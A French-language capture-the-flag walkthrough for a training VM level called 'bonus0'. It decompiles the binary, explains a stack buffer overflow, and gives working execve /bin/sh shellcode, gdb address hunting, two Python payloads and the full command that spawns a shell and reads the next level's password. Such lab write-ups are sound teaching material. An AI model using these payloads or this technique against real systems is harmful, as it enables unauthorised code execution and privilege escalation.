# Bonus 0
## Walkthrough

Voici les étapes suivit pour accéder au niveau supérieur, soit le `bonus1`.

1. Une fois connecté à la VM sur le `bonus0`, l'on retrouve un fichier `bonus0` situé à la racine du dossier utilisateur. Ce dernier s'avère être de nouveau un exécutable ELF (Executable and Linkable Format).

2. On extrait ce fichier sur la machine host soit en utilisant la commande `scp` soit en utilisant un logiciel créer à cet effet.

	```sh
	> scp -P 4242 bonus0@127.0.0.1:bonus0 /path/on/machine/host
	```

3. On ouvre ensuite ce fichier dans Ghidra et après analyse, on obtient le désassemblage ci-dessous (que l'on refactorise pour plus de clarté).

    ```sh
    #include <stdlib.h>
    #include <stdio.h>
    #include <string.h>
    #include <unistd.h>
    #include <sys/types.h>
    #include <time.h>
    #include <stdbool.h>

    void p(char *inputBuffer, char *ppBuffer)
    {
    	char buffer[4104];

    	puts(ppBuffer);
    	read(0, buffer, 4096);
    	char* ptr = strchr(buffer, '\n');
    	if (ptr != NULL) {
    		*ptr = '\0';
    	}
    	strncpy(inputBuffer, buffer, 20);
    }

    void pp(char* myBuffer)
    {
    	char global_buffer[4096] = " - ";
    	char input_1[20];
    	char input_2[20];

    	p(input_1, global_buffer);
    	p(input_2, global_buffer);
    	strcpy(myBuffer, input_1);
    	myBuffer[strlen(myBuffer)] = 0x20;
    	strcat(myBuffer, input_2);
    	return;
    }

    int main(void)
    {
    	char myBuffer[54];

    	pp(myBuffer);
    	puts(myBuffer);
    	return EXIT_SUCCESS;
    }
    ```
    À partir de ce désassemblage, on en déduit que le programme se compose de trois fonctions : `main`, `pp`, et `p`.

    La fonction `main` déclare un tableau de caractères appelé `myBuffer` de taille `54` et appelle la fonction `pp` pour remplir ce tableau avec les entrées de l'utilisateur, puis affiche le résultat.

    La fonction `pp` prend un argument de type pointeur vers un tableau de caractères, soit `char* myBuffer`. Elle appelle ensuite la fonction `p` deux fois de manière consécutive pour obtenir deux entrées utilisateur, `input_1` et `input_2`. Enfin, elle concatène ces deux entrées dans `myBuffer`, les séparant par un espace.

    Enfin, la fonction `p` prend deux arguments de type char `*` : `inputBuffer` et `ppBuffer`. Elle lit une ligne d'entrée de l'utilisateur en utilisant `ppBuffer` comme message d'instruction, puis stocke cette entrée dans `inputBuffer`.

4. On constate que le programme de fait aucune appelle directe à une fonction qui permet soit d'exécuter un `shell interactif` soit d'effectuer un `cat` du fichier contenant le mot de passe du niveau suivant. De fait, comme dans certains niveaux précédent, il faudra faire appel à `shellcode` permettant l'exécution d'un `shell interactif`. Pour ce faire, on exploitera une vulnérabilité de débordement de tampon dans la fonction `p` dû à l'utilisation de la fonction `read` sans une vérification appropriée de la taille de l'entrée utilisateur. En effet, en injectant un premier `payload` contenant notre `shellcode` lors de la saisie utilisateur, il est possible de déborder le `buffer` et écraser l'adresse de retour. Le deuxième appel à la fonction `pp` permet, quant à lui, d'utiliser un second `payload` pour redirigeant l'exécution vers le `shellcode`. Cela permet d'obtenir un `shell` avec les droits de l'utilisateur en cours, facilitant l'accès au mot de passe de l'utilisateur `bonus1`.

   Shellcode :

    ```sh
    "\x31\xc0\x50\x68\x2f\x2f\x73"
    "\x68\x68\x2f\x62\x69\x6e\x89"
    "\xe3\x89\xc1\x89\xc2\xb0\x0b"
    "\xcd\x80\x31\xc0\x40\xcd\x80"
    ```

    Lien : https://shell-storm.org/shellcode/files/shellcode-811.html

5. Ainsi, dans un premier temps, l'on va récupérer l'adresse du `buffer` déclarer dans la fonction `p` et utilisé par la fonction `read`. Pour ce faire, on va exécuter `bonus` avec `gdb` en effectuant les étapes ci-dessous.

    ```sh
    (gdb) break p
		Breakpoint 1 at 0x80484bd
	(gdb) run
	(gdb) p/x $ebp - 0x1008
		$1 = 0xbfffe680
	(gdb) disas p
		Dump of assembler code for function p:
			[...]
			0x080484c3 <+15>:    call   0x80483b0 <puts@plt>
			0x080484c8 <+20>:    movl   $0x1000,0x8(%esp)
			0x080484d0 <+28>:    lea    -0x1008(%ebp),%eax
			0x080484d6 <+34>:    mov    %eax,0x4(%esp)
			0x080484da <+38>:    movl   $0x0,(%esp)
			0x080484e1 <+45>:    call   0x8048380 <read@plt>
			[...]
		End of
	(gdb) b *0x080484d6
		Breakpoint 1 at 0x80484d6
	(gdb) run
    	(gdb) step
	(gdb) info registers
		eax            0xbfffe680	-1073748352
		[...]
    ```

    Ainsi, on obtient l'adresse `0xbfffe680` pour la variable `buffer` dans la fonction `p`.

6. On peut à présent générer les 2 `payloads` ci-dessous.

    - Premier `payload` :

        ```sh
        python -c "print('\x90' * 1000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')"
        ```
        On a :
        - `'\x90' * 1000`: L'overflow nécessaire pour mener au `shellcode` ;
	    - `'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'`: Le `shellcode` en lui-même.

    - Second `paylaod` :

        ```sh
        python -c "print('\x90' * 9 + '\x74\xe8\xff\xbf' + '\x90' * 7)"
        ```

        On a :
        - `'\x90' * 9`: L'overflow nécessaire pour mener à l'adresse de la variable `buffer` ;
    	- `'\x74\xe8\xff\xbf'`: L'adresse du `buffer` en format `little-endian`
    	- `'\x90' * 7`: L'overflow nécessaire pour overwrite `input_1` et l'adresse de retour.

        À noter que l'adresse `0xbfffe680` n'est pas directement utilisée comme adresse de `buffer` dans l'exploit. En effet, le programme alloue un tampon de `54 octets`, répartis entre :
        - `20 octets` pour `input_1` ;
        - `20 octets` pour `input_2` ;
        - `1 octet` pour le caractère nul `\0` ajouté par l'utilisation de la fonction `strcat`.

        De fait, `41 octets` du tampon sont déjà occupés par des données.

        De plus, sachant que l'adresse de début du tampon, `0xbfffe680`, étant sur `4 octets`, il reste `9 octets` à combler pour atteindre l'adresse de `input_2` et `7 octets` à combler pour atteindre l'adresse de `input_1`.

        Sachant que l'on utilisant un débordement de `1000 octets` dans le premier `payload`, l'adresse du tampon doit être décalée de la moitié, soit `500 octets`. Résultant, ainsi, en l'adresse finale (0xbfffe874).

        Ce calcul précis permet de contrôler soigneusement le dépassement de tampon, assurant l'atteinte des adresses cible nécessaires à l'exécution réussie du `shellcode`.


7. Il manque plus qu'à lancer le programme avec les `payloads` précédemment définies pour `buffer overflow` la fonction `read` dans `p` en débordant le `buffer`, écraser l'adresse de retour et, ainsi, lancer notre `shell interactif` via notre `shellcode`. On exécute la fonction `whoami` pour s'assurer que l'on est bien l'utilisateur `bonus1` et non plus l'utilisateur `bonus0`. Enfin, on `cat` le fichier `/home/user/bonus1/.pass` pour obtenir le mot de passe.

    ```sh
    > (python -c "print('\x90' * 1000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')";python -c "print('\x90' * 9 + '\x74\xe8\xff\xbf' + '\x90' * 7)"; cat -) | ./bonus0
    > whoami
    bonus1
    > cat /home/user/bonus1/.pass
    cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
    ```

8. On peut à présent passer au niveau supérieur en exécutant la commande `su bonus1` et en y spécifiant le mot de passe qui vient d'être trouvée.

    ```sh
    > su bonus1
    Password :
    > cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
    ```
